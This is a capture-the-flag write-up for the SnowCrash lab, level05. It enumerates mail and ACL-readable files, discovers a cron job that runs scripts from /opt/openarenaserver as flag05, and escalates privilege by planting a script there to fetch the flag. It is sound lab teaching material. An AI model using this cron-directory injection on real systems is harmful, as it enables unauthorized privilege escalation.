# level04

## Scanning

**1. Login notices ?** 👀
```sh
$ sshpass -p "$password" ssh $username@$host -p $port
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 fd17:625c:f037:2:d036:b1ee:c14:fee9 fd17:625c:f037:2:a00:27ff:fe45:e6fd 
You have new mail.
level05@SnowCrash:~$ 
```

**2. Who are we ?**
```sh
$ id
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```

**3. Where are we ?**
```sh
$ ls -laR
.:
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

**4. Mail related files ?** 👀
```sh
$ find / \( -path /proc -o -path /dev -o -path /rofs \) -prune -o -name mail -print 2>/dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
$ ls -l /var/mail
total 4
-rw-r--r--+ 1 root mail 58 Jun 12 13:04 level05
```

**5. Privileged account owned files** 👀
```sh
$ find / \( -path /proc -o -path /dev -o -path /rofs \) -prune -o -user flag05 -print 2>/dev/null
/usr/sbin/openarenaserver
```

## Solution

We have found multiple suspicious files:
- `/usr/lib/byobu/mail`
- `/var/mail/level05`
- `/usr/sbin/openarenaserver`

All three files are readable.
The two first by normal means and the last through Access Control List (ACL) rules:
```sh
$ getfacl /usr/sbin/openarenaserver 
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

The existance of the `/usr/lib/byobu` directory indicates that the [Byobu](https://byobu.org/) service is installed on the system.

The `/usr/lib/byobu/mail` file is sourced by Byobu's status module. providing it the path to the current user's system mail file and functions for status display.
```sh
$ cat /usr/lib/byobu/mail
# Omitted lines... 
MAILFILE="/var/spool/mail/$USER"
# Omitted lines...
```

We decide to read the specified user's system mail file `/var/spool/mail/$USER`.
```sh
$ cat /var/spool/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
It should contain raw text, but we instead get something that resembles a crontab entry. This is likely the output of a script or system process that has been automatically delivered to our mailbox by the system mail service. The content may suggest the existence of a cron job that executes `/usr/sbin/openarenaserver` as the `flag05` user every **two minutes**.

We then check the content of the specified script `/usr/sbin/openarenaserver`.
```sh
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
It executes scripts located in `/opt/openarenaserver/` before deleting them. It enforces a maximum CPU execution time of 5 seconds and runs each script in a subshell in debug mode using `bash -x`.

If the suggested crontab rule exists, it would execute blindly all scripts present in the `/opt/openarenaserver/` folder as the `flag05` user.
We can verify it's existance by creating a test script.
```sh
$ echo 'echo "Hello all" | wall' > /opt/openarenaserver/wall.sh
# After a small wait...
Broadcast Message from flag05@Snow                                             
        (somewhere) at 15:20 ...                                               
                                                                               
Hello all     
```

We now know the `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05` crontab rule exists and that it allows privilege escalation by injecting custom scripts into the `/opt/openarenaserver/` directory.
```sh
$ echo "/bin/getflag > /tmp/checkflag.txt; chmod 777 /tmp/checkflag.txt" > /opt/openarenaserver/getflag.sh;
$ while [ ! -e /tmp/checkflag.txt ]; do sleep 0.5; done; cat /tmp/checkflag.txt;
```

And there is the flag !
